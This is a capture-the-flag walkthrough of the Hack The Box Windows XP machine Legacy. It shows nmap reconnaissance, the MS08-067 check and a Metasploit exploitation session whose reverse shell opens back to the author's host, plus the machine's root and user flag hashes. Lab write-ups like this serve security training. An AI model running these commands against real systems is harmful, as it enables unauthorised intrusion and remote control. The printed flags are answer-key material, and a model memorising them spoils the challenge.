This is my write-up/walkthrough for [the Hack The Box machine, Legacy](https://app.hackthebox.com/machines/Legacy). It's a Windows machine, rated "Easy", with 10.10.10.4 as its IP address.

![Alt text](/images/legacy/2022-03-06-hack-the-box-legacy-01.JPG "Legacy Info Card")

I started with an nmap scan—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 11:47 EST
Nmap scan report for 10.10.10.4
Host is up (0.32s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (87%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m40s, deviation: 1h24m50s, median: 4d23h57m40s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:2f:6e (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-03-11T20:46:02+02:00

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   381.37 ms 10.10.16.1
2   381.38 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.02 seconds
```

—that told me, more than anything else, this box is running Windows XP with port 445 (SMB) open. My immediate thought was that there has to be a known vulnerability out there for this, and turned out, there indeed is – [MS08-067](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067). 

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ nmap -Pn --script smb-vuln-ms08-067.nse 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 11:58 EST
Nmap scan report for 10.10.10.4
Host is up (0.19s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```

I then found out [this](https://www.pentestpundit.com/2020/04/exploit-windows-xp-smb-service-ms08-067.html) article that details how to exploit that vulnerability using Metasploit—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo msfconsole 
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true

msf6 > search MS08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 > info 0

       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
     Module: exploit/windows/smb/ms08_067_netapi
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2008-10-28

Provided by:
  hdm <x@hdm.io>
  Brett Moore <brett.moore@insomniasec.com>
  frank2 <frank2@dc949.org>
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic Targeting
  1   Windows 2000 Universal
  2   Windows XP SP0/SP1 Universal
  3   Windows 2003 SP0 Universal
  4   Windows XP SP2 English (AlwaysOn NX)
  5   Windows XP SP2 English (NX)
  6   Windows XP SP3 English (AlwaysOn NX)
  7   Windows XP SP3 English (NX)
  8   Windows XP SP2 Arabic (NX)
  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
  10  Windows XP SP2 Chinese - Simplified (NX)
  11  Windows XP SP2 Chinese - Traditional (NX)
  12  Windows XP SP2 Czech (NX)
  13  Windows XP SP2 Danish (NX)
  14  Windows XP SP2 German (NX)
  15  Windows XP SP2 Greek (NX)
  16  Windows XP SP2 Spanish (NX)
  17  Windows XP SP2 Finnish (NX)
  18  Windows XP SP2 French (NX)
  19  Windows XP SP2 Hebrew (NX)
  20  Windows XP SP2 Hungarian (NX)
  21  Windows XP SP2 Italian (NX)
  22  Windows XP SP2 Japanese (NX)
  23  Windows XP SP2 Korean (NX)
  24  Windows XP SP2 Dutch (NX)
  25  Windows XP SP2 Norwegian (NX)
  26  Windows XP SP2 Polish (NX)
  27  Windows XP SP2 Portuguese - Brazilian (NX)
  28  Windows XP SP2 Portuguese (NX)
  29  Windows XP SP2 Russian (NX)
  30  Windows XP SP2 Swedish (NX)
  31  Windows XP SP2 Turkish (NX)
  32  Windows XP SP3 Arabic (NX)
  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
  34  Windows XP SP3 Chinese - Simplified (NX)
  35  Windows XP SP3 Chinese - Traditional (NX)
  36  Windows XP SP3 Czech (NX)
  37  Windows XP SP3 Danish (NX)
  38  Windows XP SP3 German (NX)
  39  Windows XP SP3 Greek (NX)
  40  Windows XP SP3 Spanish (NX)
  41  Windows XP SP3 Finnish (NX)
  42  Windows XP SP3 French (NX)
  43  Windows XP SP3 Hebrew (NX)
  44  Windows XP SP3 Hungarian (NX)
  45  Windows XP SP3 Italian (NX)
  46  Windows XP SP3 Japanese (NX)
  47  Windows XP SP3 Korean (NX)
  48  Windows XP SP3 Dutch (NX)
  49  Windows XP SP3 Norwegian (NX)
  50  Windows XP SP3 Polish (NX)
  51  Windows XP SP3 Portuguese - Brazilian (NX)
  52  Windows XP SP3 Portuguese (NX)
  53  Windows XP SP3 Russian (NX)
  54  Windows XP SP3 Swedish (NX)
  55  Windows XP SP3 Turkish (NX)
  56  Windows 2003 SP1 English (NO NX)
  57  Windows 2003 SP1 English (NX)
  58  Windows 2003 SP1 Japanese (NO NX)
  59  Windows 2003 SP1 Spanish (NO NX)
  60  Windows 2003 SP1 Spanish (NX)
  61  Windows 2003 SP1 French (NO NX)
  62  Windows 2003 SP1 French (NX)
  63  Windows 2003 SP2 English (NO NX)
  64  Windows 2003 SP2 English (NX)
  65  Windows 2003 SP2 German (NO NX)
  66  Windows 2003 SP2 German (NX)
  67  Windows 2003 SP2 Portuguese - Brazilian (NX)
  68  Windows 2003 SP2 Spanish (NO NX)
  69  Windows 2003 SP2 Spanish (NX)
  70  Windows 2003 SP2 Japanese (NO NX)
  71  Windows 2003 SP2 French (NO NX)
  72  Windows 2003 SP2 French (NX)

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT    445              yes       The SMB service port (TCP)
  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload information:
  Space: 408
  Avoid: 8 characters

Description:
  This module exploits a parsing flaw in the path canonicalization 
  code of NetAPI32.dll through the Server Service. This module is 
  capable of bypassing NX on some operating systems and service packs. 
  The correct target must be used to prevent the Server Service (along 
  with a dozen others in the same process) from crashing. Windows XP 
  targets seem to handle multiple successful exploitation events, but 
  2003 targets will often crash or hang on subsequent attempts. This 
  is just the first version of this module, full support for NX bypass 
  on 2003, along with other platforms, is still in development.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2008-4250
  OSVDB (49243)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/MS08-067
  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.9
LHOST => 10.10.16.9
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[-] Handler failed to bind to 10.10.16.9:1234:-  -
[-] Handler failed to bind to 0.0.0.0:1234:-  -
[-] 10.10.10.4:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:1234).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) >
```

—but it wasn't working. It turned out, for this particular exploit, and contrary to the article I had been consulting, you neither need to set `LPORT` nor have an `nc` listening for reverse shell on your machine.

```
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set RPORT 445
RPORT => 445
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.9
LHOST => 10.10.16.9
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.16.9:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.4
[*] Command shell session 1 opened (10.10.16.9:4444 -> 10.10.10.4:1031 ) at 2022-03-06 13:04:50 -0500


Shell Banner:
Microsoft Windows XP [Version 5.1.2600]
-----
          

C:\WINDOWS\system32>cd ../../
cd ../../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
16/03/2017  07:30 ��                 0 CONFIG.SYS
16/03/2017  08:07 ��    <DIR>          Documents and Settings
29/12/2017  10:41 ��    <DIR>          Program Files
11/03/2022  10:01 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.313.807.872 bytes free

C:\>cd WINDOWS
cd WINDOWS

C:\WINDOWS>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\WINDOWS

11/03/2022  10:01 ��    <DIR>          .
11/03/2022  10:01 ��    <DIR>          ..
11/03/2022  10:02 ��                 0 0.log
16/03/2017  07:18 ��    <DIR>          addins
16/03/2017  07:19 ��    <DIR>          AppPatch
23/08/2001  02:00 ��             1.272 Blue Lace 16.bmp
23/08/2001  02:00 ��            82.944 clock.avi
16/03/2017  07:27 ��               200 cmsetacl.log
23/08/2001  02:00 ��            17.062 Coffee Bean.bmp
16/03/2017  07:32 ��            15.905 comsetup.log
16/03/2017  07:18 ��    <DIR>          Config
16/03/2017  07:18 ��    <DIR>          Connection Wizard
16/03/2017  07:30 ��                 0 control.ini
16/03/2017  07:28 ��    <DIR>          Cursors
16/03/2017  07:20 ��    <DIR>          Debug
23/08/2001  02:00 ��                 2 desktop.ini
16/03/2017  07:18 ��    <DIR>          Driver Cache
16/03/2017  07:28 ��               130 DtcInstall.log
16/03/2017  07:19 ��    <DIR>          ehome
14/04/2008  05:42 ��         1.033.728 explorer.exe
23/08/2001  02:00 ��                80 explorer.scf
16/03/2017  07:29 ��            11.537 FaxSetup.log
23/08/2001  02:00 ��            16.730 FeatherTexture.bmp
23/08/2001  02:00 ��            17.336 Gone Fishing.bmp
23/08/2001  02:00 ��            26.582 Greenstone.bmp
16/03/2017  07:29 ��    <DIR>          Help
14/04/2008  05:42 ��            10.752 hh.exe
16/03/2017  07:32 ��            48.335 iis6.log
16/03/2017  07:30 ��    <DIR>          ime
16/03/2017  07:32 ��             4.382 imsins.log
16/03/2017  07:18 ��    <DIR>          java
16/03/2017  07:19 ��    <DIR>          L2Schemas
29/12/2017  10:41 ��    <DIR>          LastGood.Tmp
16/03/2017  07:29 ��             1.487 MedCtrOC.log
16/03/2017  07:19 ��    <DIR>          Media
16/03/2017  07:19 ��    <DIR>          msagent
16/03/2017  07:18 ��    <DIR>          msapps
23/08/2001  02:00 ��             1.405 msdfmap.ini
16/03/2017  07:29 ��               871 msgsocm.log
16/03/2017  07:28 ��            10.066 msmqinst.log
16/03/2017  07:19 ��    <DIR>          mui
16/03/2017  07:29 ��             2.790 netfxocm.log
16/03/2017  07:19 ��    <DIR>          Network Diagnostic
14/04/2008  05:42 ��            69.120 NOTEPAD.EXE
16/03/2017  07:32 ��             7.948 ntdtcsetup.log
16/03/2017  07:29 ��            14.772 ocgen.log
16/03/2017  07:32 ��               885 ocmsn.log
16/03/2017  07:30 ��             4.161 ODBCINST.INI
16/03/2017  08:07 ��             1.178 OEWABLog.txt
16/03/2017  07:29 ��    <DIR>          Offline Web Pages
16/03/2017  07:29 ��    <DIR>          pchealth
16/03/2017  07:19 ��    <DIR>          PeerNet
23/08/2001  02:00 ��            65.954 Prairie Wind.bmp
29/12/2017  10:41 ��    <DIR>          Prefetch
16/03/2017  07:18 ��    <DIR>          Provisioning
14/04/2008  05:42 ��           146.432 regedit.exe
16/03/2017  07:30 ��    <DIR>          Registration
16/03/2017  07:32 ��             8.192 REGLOCS.OLD
16/03/2017  07:24 ��             1.690 regopt.log
16/03/2017  07:18 ��    <DIR>          repair
16/03/2017  07:18 ��    <DIR>          Resources
23/08/2001  02:00 ��            17.362 Rhododendron.bmp
23/08/2001  02:00 ��            26.680 River Sumida.bmp
23/08/2001  02:00 ��            65.832 Santa Fe Stucco.bmp
29/12/2017  10:42 ��             1.432 SchedLgU.Txt
16/03/2017  07:30 ��    <DIR>          security
16/03/2017  07:29 ��             1.022 sessmgr.setup.log
14/04/2008  07:40 ��         1.296.669 SET3.tmp
14/04/2008  07:34 ��         1.088.840 SET4.tmp
14/04/2008  07:34 ��            16.535 SET8.tmp
29/12/2017  10:41 ��           159.975 setupact.log
11/03/2022  10:01 ��           208.670 setupapi.log
16/03/2017  07:20 ��                 0 setuperr.log
16/03/2017  07:33 ��           747.894 setuplog.txt
23/08/2001  02:00 ��            65.978 Soap Bubbles.bmp
16/03/2017  07:33 ��    <DIR>          SoftwareDistribution
16/03/2017  07:29 ��    <DIR>          srchasst
16/03/2017  07:22 ��                 0 Sti_Trace.log
16/03/2017  07:20 ��    <DIR>          system
16/03/2017  07:20 ��               231 system.ini
11/03/2022  10:02 ��    <DIR>          system32
16/03/2017  07:32 ��             1.252 tabletoc.log
23/08/2001  02:00 ��            15.360 TASKMAN.EXE
29/12/2017  10:41 ��    <DIR>          Temp
16/03/2017  07:32 ��            10.801 tsoc.log
23/08/2001  02:00 ��            94.784 twain.dll
16/03/2017  07:18 ��    <DIR>          twain_32
14/04/2008  05:42 ��            50.688 twain_32.dll
23/08/2001  02:00 ��            49.680 twunk_16.exe
23/08/2001  02:00 ��            25.600 twunk_32.exe
16/03/2017  07:28 ��                36 vb.ini
16/03/2017  07:28 ��                37 vbaddin.ini
23/08/2001  02:00 ��            18.944 vmmreg32.dll
16/03/2017  07:29 ��    <DIR>          Web
16/03/2017  07:22 ��               501 wiadebug.log
16/03/2017  07:22 ��                49 wiaservc.log
16/03/2017  07:30 ��               477 win.ini
11/03/2022  10:01 ��            13.376 WindowsUpdate.log
23/08/2001  02:00 ��           256.192 winhelp.exe
14/04/2008  05:42 ��           283.648 winhlp32.exe
29/12/2017  10:41 ��    <DIR>          WinSxS
16/03/2017  08:07 ��             1.107 wmsetup.log
16/03/2017  07:30 ��           316.640 WMSysPr9.prx
23/08/2001  02:00 ��             9.522 Zapotec.bmp
23/08/2001  02:00 ��               707 _default.pif
              68 File(s)      6.470.449 bytes
              37 Dir(s)   6.313.406.464 bytes free

C:\WINDOWS>cd ../
cd ../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
16/03/2017  07:30 ��                 0 CONFIG.SYS
16/03/2017  08:07 ��    <DIR>          Documents and Settings
29/12/2017  10:41 ��    <DIR>          Program Files
11/03/2022  10:01 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.313.402.368 bytes free

C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.313.402.368 bytes free

C:\Documents and Settings>cd Administrator
cd Administrator

C:\Documents and Settings\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:18 ��    <DIR>          Desktop
16/03/2017  08:07 ��    <DIR>          Favorites
16/03/2017  08:07 ��    <DIR>          My Documents
16/03/2017  07:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.313.398.272 bytes free

C:\Documents and Settings\Administrator>cd Desktop
cd Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18 ��    <DIR>          .
16/03/2017  08:18 ��    <DIR>          ..
16/03/2017  08:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.313.283.584 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>cd ../../john
cd ../../john

C:\Documents and Settings\john>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john

16/03/2017  07:33 ��    <DIR>          .
16/03/2017  07:33 ��    <DIR>          ..
16/03/2017  08:19 ��    <DIR>          Desktop
16/03/2017  07:33 ��    <DIR>          Favorites
16/03/2017  07:33 ��    <DIR>          My Documents
16/03/2017  07:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.313.283.584 bytes free

C:\Documents and Settings\john>cd Desktop
cd Desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.313.279.488 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop>
```

